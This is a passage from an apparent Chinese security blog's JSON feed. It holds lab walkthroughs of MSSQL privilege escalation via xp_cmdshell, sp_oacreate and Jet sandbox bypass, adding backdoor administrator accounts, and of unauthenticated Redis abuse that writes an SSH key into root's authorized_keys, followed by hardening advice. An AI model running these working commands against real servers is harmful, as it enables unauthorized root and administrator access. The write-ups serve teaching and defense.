sp_configure <span class=\"string\">&#x27;show advanced options&#x27;</span>, <span class=\"string\">&#x27;1&#x27;</span>;  </span><br></pre></td></tr></table></figure>\n<p>sp_configure 的作用是显示或更改当前服务器的全局配置的高级选项，执行成功返回 0，失败返回 1，其中高级选项中包含 cmdshell 等。</p>\n<h2 id=\"0x02-xp_cmdshell提权步骤\"><a class=\"markdownIt-Anchor\" href=\"#0x02-xp_cmdshell提权步骤\">#</a> 0x02 xp_cmdshell 提权步骤</h2>\n<h3 id=\"1第一步更改当前服务器的全局配置首选高级选项为1\"><a class=\"markdownIt-Anchor\" href=\"#1第一步更改当前服务器的全局配置首选高级选项为1\">#</a> ①第一步，更改当前服务器的全局配置首选高级选项为 1</h3>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\">#以下大写字母均可小写</span><br><span class=\"line\"><span class=\"keyword\">EXEC</span> sp_configure <span class=\"string\">&#x27;show advanced options&#x27;</span>, <span class=\"number\">1</span>;RECONFIGURE;</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20220927211220768.png\" alt=\"image-20220927211220768\"></p>\n<p>使用鼠标选中一行，然后右键选择执行</p>\n<p><img src=\"image-20220927211614093.png\" alt=\"image-20220927211614093\"></p>\n<h3 id=\"2第二步打开cmd-shell\"><a class=\"markdownIt-Anchor\" href=\"#2第二步打开cmd-shell\">#</a> ②第二步，打开 cmd-shell</h3>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">exec</span> sp_configure <span class=\"string\">&#x27;xp_cmdshell&#x27;</span>, <span class=\"number\">1</span>;reconfigure;</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20220927211736845.png\" alt=\"image-20220927211736845\"></p>\n<h3 id=\"3第三步输入你想执行的windows-cmd命令\"><a class=\"markdownIt-Anchor\" href=\"#3第三步输入你想执行的windows-cmd命令\">#</a> ③第三步，输入你想执行的 windows cmd 命令。</h3>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">exec</span> master..xp_cmdshell <span class=\"string\">&#x27;whoami&#x27;</span>;</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20220927211958154.png\" alt=\"image-20220927211958154\"></p>\n<p>言归正传，我们为系统添加属于 <code>攻击者自己的net user账户</code>  (主要目的是使用已知的用户名和密码)</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\">#比如，账户名是HeyJack 密码也是HeyJack</span><br><span class=\"line\"><span class=\"keyword\">exec</span> master..xp_cmdshell <span class=\"string\">&#x27;net user HeyJack HeyJack /add&#x27;</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20220927212339481.png\" alt=\"image-20220927212339481\"></p>\n<p>此时，我们在 windows 的 cmd 里，执行 net user</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\">#</span><span class=\"language-bash\">这一步是在服务器里面查看。当然，现在只是为了展示我们的创建结果。</span></span><br><span class=\"line\">net user</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20220927212609276.png\" alt=\"image-20220927212609276\"></p>\n<p>&quot;开始&quot; 菜单 — 管理工具 — 计算机管理 — 本地用户和组 — 用户 —HeyJack 右键属性 — 隶属于</p>\n<p>查看当前分组在 Users 组</p>\n<p><img src=\"image-20220927212746484.png\" alt=\"image-20220927212746484\"></p>\n<h3 id=\"4第四步将你新建的用户移到administrators组\"><a class=\"markdownIt-Anchor\" href=\"#4第四步将你新建的用户移到administrators组\">#</a> ④第四步，将你新建的用户移到 administrators 组</h3>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">exec</span> master..xp_cmdshell <span class=\"string\">&#x27;net localgroup administrators HeyJack /add&#x27;</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20220927213122417.png\" alt=\"image-20220927213122417\"></p>\n<p>继续查看我们的分组情况，可以看到，提权成功：</p>\n<p><img src=\"image-20220927213219218.png\" alt=\"image-20220927213219218\"></p>\n<h3 id=\"5第五步获取远程服务器中的目标文件\"><a class=\"markdownIt-Anchor\" href=\"#5第五步获取远程服务器中的目标文件\">#</a> ⑤第五步，获取远程服务器中的目标文件</h3>\n<p>我们假设，服务器中管理员 Administrator 创建了一个 flag.txt 文件放在了桌面，我们的 <code>最终目的</code> 就是<strong>为了获取它</strong>。</p>\n<p><img src=\"image-20220927221944235.png\" alt=\"image-20220927221944235\"></p>\n<h4 id=\"第一种方案3389远程连接\"><a class=\"markdownIt-Anchor\" href=\"#第一种方案3389远程连接\">#</a> 第一种方案，3389 远程连接</h4>\n<p>在 win+R 输入 <code>mstsc</code></p>\n<p><img src=\"image-20220927213803912.png\" alt=\"image-20220927213803912\"></p>\n<p>查看服务器 ip 并在自己的客户端上连接，ip 地址也可以通过 SQL 提权命令 + “ipconfig” 来获取</p>\n<p><img src=\"image-20220927221540178.png\" alt=\"image-20220927221540178\"></p>\n<p>然后 3389 远程连接</p>\n<p><img src=\"image-20220927213905588.png\" alt=\"image-20220927213905588\"></p>\n<p>输入刚刚新建的用户民和密码</p>\n<p><img src=\"image-20220927214036680.png\" alt=\"image-20220927214036680\"></p>\n<p>登录成功</p>\n<p><img src=\"image-20220927214149105.png\" alt=\"image-20220927214149105\"></p>\n<p>然后打开 “我的电脑”— 进入 C 盘 — 找到 “Documents and Settings”— 选择 “Administrators”— 桌面 — 即可看到 flag.txt</p>\n<p><img src=\"image-20220927221815971.png\" alt=\"image-20220927221815971\"></p>\n<h4 id=\"第二种方案使用sql提权命令获取内容\"><a class=\"markdownIt-Anchor\" href=\"#第二种方案使用sql提权命令获取内容\">#</a> 第二种方案，使用 SQL 提权命令获取内容</h4>\n<p>另外，也可以使用 SQL 提权命令去当前管理员用户桌面查找（一般 flag 会放在桌面上）</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\">#dir命令查看当前路径</span><br><span class=\"line\"><span class=\"keyword\">exec</span> master..xp_cmdshell <span class=\"string\">&#x27;dir&#x27;</span>;</span><br><span class=\"line\">#type命令查看文件内容，一般低版本中，windows桌面的路径为：C:\\Documents <span class=\"keyword\">and</span> Settings\\桌面\\flag.txt</span><br><span class=\"line\"><span class=\"keyword\">exec</span> master..xp_cmdshell <span class=\"string\">&#x27;type C:\\Documents and Settings\\Administrator\\桌面\\flag.txt&#x27;</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20220927221113281.png\" alt=\"image-20220927221113281\"></p>\n<h2 id=\"0x03-sp_oacreate提权步骤\"><a class=\"markdownIt-Anchor\" href=\"#0x03-sp_oacreate提权步骤\">#</a> 0x03 sp_oacreate 提权步骤</h2>\n<h3 id=\"1第一步更改当前服务器的全局配置首选高级选项为1-2\"><a class=\"markdownIt-Anchor\" href=\"#1第一步更改当前服务器的全局配置首选高级选项为1-2\">#</a> ①第一步，更改当前服务器的全局配置首选高级选项为 1</h3>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">exec</span> sp_configure <span class=\"string\">&#x27;show advanced options&#x27;</span>, <span class=\"number\">1</span>;reconfigure;</span><br></pre></td></tr></table></figure>\n<h3 id=\"2第二步配置ole过程\"><a class=\"markdownIt-Anchor\" href=\"#2第二步配置ole过程\">#</a> ②第二步，配置 OLE 过程</h3>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">exec</span> sp_configure <span class=\"string\">&#x27;Ole Automation Procedures&#x27;</span> ,<span class=\"number\">1</span>;reconfigure;</span><br></pre></td></tr></table></figure>\n<h3 id=\"3第三步定义shell变量int类型\"><a class=\"markdownIt-Anchor\" href=\"#3第三步定义shell变量int类型\">#</a> ③第三步，定义 shell 变量，int 类型。</h3>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">declare</span> <span class=\"variable\">@shell</span> <span class=\"type\">int</span>;</span><br></pre></td></tr></table></figure>\n<h3 id=\"4第四步生成shell对象\"><a class=\"markdownIt-Anchor\" href=\"#4第四步生成shell对象\">#</a> ④第四步，生成 shell 对象</h3>\n<p>将结果赋值给第③步生成的 shell 变量里头。</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">exec</span> sp_oacreate <span class=\"string\">&#x27;wscript.shell&#x27;</span>, <span class=\"variable\">@shell</span> output;</span><br></pre></td></tr></table></figure>\n<h3 id=\"5第五步调用shell对象的run方法来调用net-user\"><a class=\"markdownIt-Anchor\" href=\"#5第五步调用shell对象的run方法来调用net-user\">#</a> ⑤第五步，调用 shell 对象的 run 方法来调用 net user</h3>\n<p>返回值是 null，方法体是执行 system32 目录下的 cmd.exe，并使用 net user 生成 HeyJack1 账号</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">exec</span> sp_oamethod <span class=\"variable\">@shell</span>, <span class=\"string\">&#x27;run&#x27;</span>,<span class=\"keyword\">null</span>,<span class=\"string\">&#x27;c:\\windows\\system32\\cmd.exe /c net user HeyJack1 HeyJack1 /add&#x27;</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20220927230925606.png\" alt=\"image-20220927230925606\"></p>\n<h3 id=\"6第六步调用shell对象的run方法来调用net-localgroup\"><a class=\"markdownIt-Anchor\" href=\"#6第六步调用shell对象的run方法来调用net-localgroup\">#</a> ⑥第六步，调用 shell 对象的 run 方法来调用 net localgroup</h3>\n<p>返回值是 null，方法体是执行 cmd，并使用 net localgroup 将 HeyJack1 挪到 administrators 组下</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">exec</span> sp_oacreate <span class=\"string\">&#x27;wscript.shell&#x27;</span>, <span class=\"variable\">@shell</span> output;</span><br><span class=\"line\"><span class=\"keyword\">exec</span> sp_oamethod <span class=\"variable\">@shell</span>, <span class=\"string\">&#x27;run&#x27;</span>,<span class=\"keyword\">null</span>,<span class=\"string\">&#x27;c:\\windows\\system32\\cmd.exe /c net localgroup administrators HeyJack1 /add&#x27;</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20220927231033604.png\" alt=\"image-20220927231033604\"></p>\n<p>以上是使用 sp_oacreate 的提权语句，主要是用来调用 OLE 对象（Object Linking and Embedding 的缩写，VB 中的 OLE 对象），利用 OLE 对象的 run 方法执行系统命令。</p>\n<p>在 oacreate 的官方文档里明确指出了，如果要使用 OLE 对象，必须要开启 ‘Ole Automation Procedures’，也就是 EXEC sp_configure ‘Ole Automation Procedures’, 1;</p>\n<p><strong>执行上面这条语句前</strong>要执行 <code>exec sp_configure 'show advanced options', 1;</code></p>\n<p><strong>官方对这句话的解释是：</strong> <code>show advanced options</code> ,**“显示高级选项”** 选项用来显示 sp_configure 系统存储过程高级选项。</p>\n<p>当 **“显示高级选项”** 设置为 <code> 1</code>  时，可以使用 sp_configure 列出高级选项。  <code>默认值为 0</code></p>\n<h2 id=\"0x04-沙盒提权步骤不常用\"><a class=\"markdownIt-Anchor\" href=\"#0x04-沙盒提权步骤不常用\">#</a> 0x04 沙盒提权步骤 (不常用)</h2>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">--提权语句</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">exec</span> sp_configure <span class=\"string\">&#x27;show advanced options&#x27;</span> ,<span class=\"number\">1</span>;reconfigure;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">-- 不开启的话在执行xp_regwrite会提示让我们开启，</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">exec</span> sp_configure <span class=\"string\">&#x27;Ad Hoc Distributed Queries&#x27;</span> ,<span class=\"number\">1</span>;reconfigure;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">--关闭沙盒模式，如果一次执行全部代码有问题，先执行上面两句代码。</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">exec</span> master..xp_regwrite <span class=\"string\">&#x27;HKEY_LOCAL_MACHINE&#x27;</span>,<span class=\"string\">&#x27;SOFTWARE\\Microsoft\\Jet\\4.0\\Engines&#x27;</span>,<span class=\"string\">&#x27;SandBoxMode&#x27;</span>,<span class=\"string\">&#x27;REG_DWORD&#x27;</span> ,<span class=\"number\">0</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">--查询是否正常关闭，经过测试发现沙盒模式无论是开，还是关，都不会影响我们执行下面的语句。</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">exec</span> master.dbo.xp_regread <span class=\"string\">&#x27;HKEY_LOCAL_MACHINE&#x27;</span>,<span class=\"string\">&#x27;SOFTWARE\\Microsoft\\Jet\\4.0\\Engines&#x27;</span>, <span class=\"string\">&#x27;SandBoxMode&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">--执行系统命令select * from openrowset(&#x27;microsoft.jet.oledb.4.0&#x27;,&#x27;;database=c:/windows/system32/ias/ias.mdb&#x27;,&#x27;select shell(&quot;net user HeyJack2 HeyJack2 /add&quot;)&#x27;)</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">select</span> <span class=\"operator\">*</span> <span class=\"keyword\">from</span> openrowset(<span class=\"string\">&#x27;microsoft.jet.oledb.4.0&#x27;</span>,<span class=\"string\">&#x27;;database=c:/windows/system32/ias/ias.mdb&#x27;</span>,<span class=\"string\">&#x27;select shell(&quot;net localgroup administrators HeyJack2 /add&quot;)&#x27;</span>)</span><br></pre></td></tr></table></figure>\n<p>沙盒模式 SandBoxMode 参数含义（默认是 2）</p>\n<p><code>0</code> ：在任何所有者中禁止启用安全模式</p>\n<p><code>1</code>  ：为仅在允许范围内</p>\n<p><code>2</code>  ：必须在 access 模式下</p>\n<p><code>3</code> ：完全开启</p>\n<p>openrowset 是可以通过 OLE DB 访问 SQL Server 数据库，OLE DB 是应用程序链接到 SQL Server 的的驱动程序。</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">--恢复配置</span></span><br><span class=\"line\"><span class=\"keyword\">exec</span> master..xp_regwrite <span class=\"string\">&#x27;HKEY_LOCAL_MACHINE&#x27;</span>,<span class=\"string\">&#x27;SOFTWARE\\Microsoft\\Jet\\4.0\\Engines&#x27;</span>,<span class=\"string\">&#x27;SandBoxMode&#x27;</span>,<span class=\"string\">&#x27;REG_DWORD&#x27;</span> ,<span class=\"number\">1</span>;</span><br><span class=\"line\"><span class=\"keyword\">exec</span> sp_configure <span class=\"string\">&#x27;Ad Hoc Distributed Queries&#x27;</span> ,<span class=\"number\">0</span>;reconfigure;</span><br><span class=\"line\"><span class=\"keyword\">exec</span> sp_configure <span class=\"string\">&#x27;show advanced options&#x27;</span> ,<span class=\"number\">0</span>;reconfigure;</span><br></pre></td></tr></table></figure>\n<p>至此，SQL Server (MSSQL) 提权攻击演示完毕。</p>\n",
            "tags": [
                "数据库安全"
            ]
        },
        {
            "id": "https://kiyomijin.github.io/2022/09/27/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/Redis%E6%8F%90%E6%9D%83%E6%94%BB%E5%87%BB/",
            "url": "https://kiyomijin.github.io/2022/09/27/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/Redis%E6%8F%90%E6%9D%83%E6%94%BB%E5%87%BB/",
            "title": "Redis提权攻击",
            "date_published": "2022-09-26T16:02:13.000Z",
            "content_html": "<p><strong>Redis</strong>（Remote Dictionary Server )，即远程字典服务，是一个开源的使用 ANSI <a href=\"https://baike.baidu.com/item/C%E8%AF%AD%E8%A8%80\">C 语言</a>编写、支持网络、可基于内存亦可持久化的日志型、Key-Value<a href=\"https://baike.baidu.com/item/%E6%95%B0%E6%8D%AE%E5%BA%93/103728\"> 数据库</a>，并提供多种语言的 API。从 2010 年 3 月 15 日起，Redis 的开发工作由 VMware 主持。从 2013 年 5 月开始，Redis 的开发由<a href=\"https://baike.baidu.com/item/Pivotal\"> Pivotal</a> 赞助。</p>\n<h2 id=\"0x00-redis提权攻击\"><a class=\"markdownIt-Anchor\" href=\"#0x00-redis提权攻击\">#</a> 0x00 Redis 提权攻击</h2>\n<p>​\t<strong>Redis</strong> 在默认情况下，会绑定在 0.0.0.0:<strong>6379</strong> 上，如果没有进行采用相关的策略，比如添加防火墙规则避免其他非信任来源 ip 访问等，这样将会将 Redis 服务 <code>暴露到公网</code> 上。</p>\n<p>​\t如果在没有设置密码认证（一般为空）的情况下，会导致任意用户在可以访问目标服务器的情况下未授权访问 Redis 以及读取 Redis 的数据。</p>\n<p>​\t攻击者在未授权访问 Redis 的情况下，利用 Redis 自身的提供的 config 命令，可以进行写文件操作，攻击者可以成功将自己的 ssh 公钥写入目标服务器的 <code>/root/.ssh</code>  文件夹的 <code>authotrized_keys</code>  文件中，进而可以使用对应私钥直接使用 ssh 服务登录目标服务器、添加计划任务、写入 Webshell 等操作。</p>\n<table>\n<thead>\n<tr>\n<th style=\"text-align:left\"></th>\n<th style=\"text-align:left\"><strong>类型</strong></th>\n<th style=\"text-align:left\"><strong>IP</strong></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:left\"><strong>目标靶机</strong></td>\n<td style=\"text-align:left\">Ubuntu18.04</td>\n<td style=\"text-align:left\">192.168.138.143</td>\n</tr>\n<tr>\n<td style=\"text-align:left\"><strong>攻击主机</strong></td>\n<td style=\"text-align:left\">Kali2022</td>\n<td style=\"text-align:left\">192.168.138.145</td>\n</tr>\n</tbody>\n</table>\n<p>如果没有攻击机没有安装 ssh 则：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\">#</span><span class=\"language-bash\">安装</span></span><br><span class=\"line\">sudo apt install openssh-server</span><br><span class=\"line\"><span class=\"meta prompt_\">#</span><span class=\"language-bash\">启动ssh服务</span></span><br><span class=\"line\">sudo service ssh start</span><br></pre></td></tr></table></figure>\n<h2 id=\"0x01-被攻击机部分准备工作\"><a class=\"markdownIt-Anchor\" href=\"#0x01-被攻击机部分准备工作\">#</a> 0x01 被攻击机部分准备工作</h2>\n<p>在 Ubuntu 安装 redis 服务器</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo apt-get install redis-server</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20220926212305161.png\" alt=\"image-20220926212305161\"></p>\n<p>修改 /etc/redis/redis.conf，总共有三点：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo vim /etc/redis/redis.conf</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20220926212807655.png\" alt=\"image-20220926212807655\"></p>\n<p>①去除 bind</p>\n<p><img src=\"image-20220926213107025.png\" alt=\"image-20220926213107025\"></p>\n<p>②daemonize yes</p>\n<p><img src=\"image-20220926213521318.png\" alt=\"image-20220926213521318\"></p>\n<p>③protected-mode no</p>\n<p><img src=\"image-20220926232253189.png\" alt=\"image-20220926232253189\"></p>\n<p>重启服务</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">service redis stop</span><br><span class=\"line\"><span class=\"meta prompt_\">#</span><span class=\"language-bash\">以root身份启动redis服务</span></span><br><span class=\"line\">sudo redis-server /etc/redis/redis.conf</span><br><span class=\"line\"><span class=\"meta prompt_\">#</span><span class=\"language-bash\">尝试在服务器上自己连一下</span></span><br><span class=\"line\">redis-cli</span><br><span class=\"line\">(显示127.0.0.1:6379则OK)</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20220926232522408.png\" alt=\"image-20220926232522408\"></p>\n<h2 id=\"0x02-攻击机部分准备工作\"><a class=\"markdownIt-Anchor\" href=\"#0x02-攻击机部分准备工作\">#</a> 0x02 攻击机部分准备工作</h2>\n<p>在攻击机上生成 rsa 秘钥</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">ssh-keygen -t rsa</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20220926214148985.png\" alt=\"\"></p>\n<p>重定向到 key.txt</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">cd /home/kali/.ssh</span><br><span class=\"line\">(echo -e &quot;\\n\\n&quot;; cat id_rsa.pub; echo -e &quot;\\n\\n&quot;) &gt; key.txt</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20220926214549834.png\" alt=\"image-20220926214549834\"></p>\n<p>第二句话的含义？其实就是在 id_rsa.pub 的前后加了一个回车</p>\n<p><img src=\"image-20220926214811675.png\" alt=\"image-20220926214811675\"></p>\n<p>之后，我们在攻击机（也就是我的 kali）上安装 redis-cli</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">wget http://download.redis.io/redis-stable.tar.gz</span><br><span class=\"line\">tar -zxf redis-stable.tar.gz</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">进入到 redis-stable 目录</span></span><br><span class=\"line\">cd redis-stable</span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">编译</span></span><br><span class=\"line\">make</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\">#</span><span class=\"language-bash\">拷贝</span></span><br><span class=\"line\"><span class=\"meta prompt_\">#</span><span class=\"language-bash\">编译完成之后，再将 src 目录下的 redis-cli 拷贝到 /usr/bin/ 目录下一份，这样就可直接使用 redis-cli 了</span></span><br><span class=\"line\">sudo cp ./src/redis-cli /usr/bin/</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20220926220032721.png\" alt=\"image-20220926220032721\"></p>\n<p>出现如下字样就说明安装成功：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">redis-cli</span><br><span class=\"line\">回车</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20220926220238790.png\" alt=\"image-20220926220238790\"></p>\n<p>将我们生成的 key.txt 放到远程主机 (也就是开了 redis 服务的服务器) 的 redis-cli 内存上，查看远程服务器的 ip 为：192.168.138.143</p>\n<p><img src=\"image-20220926220116946.png\" alt=\"image-20220926220116946\"></p>\n<h2 id=\"0x03-开始攻击\"><a class=\"markdownIt-Anchor\" href=\"#0x03-开始攻击\">#</a> 0x03 开始攻击</h2>\n<p>拿到 redis 的 shell 后基本操作：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">info  #查看redis的信息和服务器信息</span><br><span class=\"line\">flushall 删除全部数据</span><br><span class=\"line\">del key  删除键为key的数据</span><br><span class=\"line\">get key  得到参数key的数据</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20220926234426901.png\" alt=\"image-20220926234426901\"></p>\n<p>在我们的攻击机 (kali) 上运行如下代码：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">cat /home/kali/.ssh/key.txt | redis-cli -h 192.168.138.143 -x set test</span><br><span class=\"line\">看到回显了OK以后</span><br><span class=\"line\">redis-cli -h 192.168.138.143进入shell</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20220926222112479.png\" alt=\"image-20220926222112479\"></p>\n<p>将目录切换到 /root/.ssh</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">config set dir /root/.ssh</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20220926231146929.png\" alt=\"image-20220926231146929\"></p>\n<p>设置数据库名，覆盖我们的文件（保存数据库的内容到 /root/.ssh/authorized_keys ）</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">config set dbfilename authorized_keys</span><br><span class=\"line\">save</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20220926232746706.png\" alt=\"\"></p>\n<p>最后，回到生成秘钥的终端：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\">#</span><span class=\"language-bash\">使用ssh命令 以root用户的身份 连接“被攻击机”的ip</span></span><br><span class=\"line\">ssh root@192.168.138.143</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20220926232832651.png\" alt=\"image-20220926232832651\"></p>\n<p>至此，redis 提权攻击完成。</p>\n<h2 id=\"0x04-修复建议安全加固\"><a class=\"markdownIt-Anchor\" href=\"#0x04-修复建议安全加固\">#</a> 0x04 修复建议 / 安全加固</h2>\n<h3 id=\"1禁止一些高危命令重启redis才能生效\"><a class=\"markdownIt-Anchor\" href=\"#1禁止一些高危命令重启redis才能生效\">#</a> <strong>1. 禁止一些高危命令</strong> (重启 redis 才能生效)</h3>\n<p>修改 redis.conf 文件，添加</p>\n<figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">rename-command</span> <span class=\"string\">FLUSHALL</span> <span class=\"string\">&quot;&quot;</span></span><br><span class=\"line\"><span class=\"string\">rename-command</span> <span class=\"string\">CONFIG</span> <span class=\"string\">&quot;&quot;</span></span><br><span class=\"line\"><span class=\"string\">rename-command</span> <span class=\"string\">EVAL</span> <span class=\"string\">&quot;&quot;</span></span><br></pre></td></tr></table></figure>\n<p>或者另起名字</p>\n<figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">rename-command</span> <span class=\"string\">FLUSHALL</span> <span class=\"string\">&quot;name1&quot;</span></span><br><span class=\"line\"><span class=\"string\">rename-command</span> <span class=\"string\">CONFIG</span> <span class=\"string\">&quot;name2&quot;</span></span><br><span class=\"line\"><span class=\"string\">rename-command</span> <span class=\"string\">EVAL</span> <span class=\"string\">&quot;name3&quot;</span></span><br></pre></td></tr></table></figure>\n<p>来禁用远程修改 DB 文件地址</p>\n<h3 id=\"2以低权限运行-redis-服务\"><a class=\"markdownIt-Anchor\" href=\"#2以低权限运行-redis-服务\">#</a> <strong>2. 以低权限运行 Redis 服务</strong></h3>\n<p>为 Redis 服务创建单独的用户和家目录，并且配置禁止登陆</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">groupadd -r redis &amp;&amp; useradd -r -g redis redis</span><br></pre></td></tr></table></figure>\n<h3 id=\"3为-redis-添加密码验证\"><a class=\"markdownIt-Anchor\" href=\"#3为-redis-添加密码验证\">#</a> <strong>3. 为 Redis 添加密码验证</strong></h3>\n<p>修改 redis.conf 文件，添加</p>\n<figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">requirepass</span> <span class=\"string\">mypassword</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"4禁止外网访问-redis\"><a class=\"markdownIt-Anchor\" href=\"#4禁止外网访问-redis\">#</a> <strong>4. 禁止外网访问 Redis</strong></h3>\n<p>修改 redis.conf 文件，添加或修改，使得 Redis 服务只在当前主机可用</p>\n<figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">bind</span> <span class=\"number\">127.0</span><span class=\"number\">.0</span><span class=\"number\">.1</span> <span class=\"string\">::1</span></span><br></pre></td></tr></table></figure>\n<p>redis 3.2 之后，redis 增加了 protected-mode ，在这个模式下，非绑定 IP 或者没有配置密码时都会报错。</p>\n<h3 id=\"5保证-authorized_keys-文件的安全\"><a class=\"markdownIt-Anchor\" href=\"#5保证-authorized_keys-文件的安全\">#</a> <strong>5. 保证 authorized_keys 文件的安全</strong></h3>\n<p>为了保证安全，您应该阻止其他用户添加新的公钥。</p>\n<p>将 authorized_keys 的权限设置为对拥有者只读，其他用户没有任何权限：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">chmod 400 ~/.ssh/authorized_keys</span><br></pre></td></tr></table></figure>\n<p>为保证 authorized_keys 的权限不会被改掉，您还需要设置该文件的 immutable 位权限：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">chattr +i ~/.ssh/authorized_keys</span><br></pre></td></tr></table></figure>\n<p>然而，用户还可以重命名～/.ssh，然后新建新的～/.ssh 目录和 authorized_keys 文件。要避免这种情况，需要设置～./ssh 的 immutable 位权限：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">chattr +i ~/.ssh</span><br></pre></td></tr></table></figure>\n<p><strong>注意:</strong> 如果需要添加新的公钥，需要移除 authorized_keys 的 immutable 位权限。然后，添加好新的公钥之后，按照上述步骤重新加上 immutable 位权限。</p>\n<h3 id=\"6修改默认端口\"><a class=\"markdownIt-Anchor\" href=\"#6修改默认端口\">#</a> <strong>6. 修改默认端口</strong></h3>\n<p>修改 redis.conf 文件， 找到并修改原来的 <code>port 6379</code>  ，比如改成 <code>port 17033</code> ，让人摸不着头脑。</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">port 17033 </span><br></pre></td></tr></table></figure>\n",
            "tags": [
                "数据库安全"
            ]
        },
        {
            "id": "https://kiyomijin.github.io/2022/09/17/CTF%E5%B0%8F%E8%AE%AD/Misc/Misc%E2%80%94%E2%80%94%E7%A7%81%E6%9C%89bit%E9%9A%90%E5%86%99/",
            "url": "https://kiyomijin.github.io/2022/09/17/CTF%E5%B0%8F%E8%AE%AD/Misc/Misc%E2%80%94%E2%80%94%E7%A7%81%E6%9C%89bit%E9%9A%90%E5%86%99/",
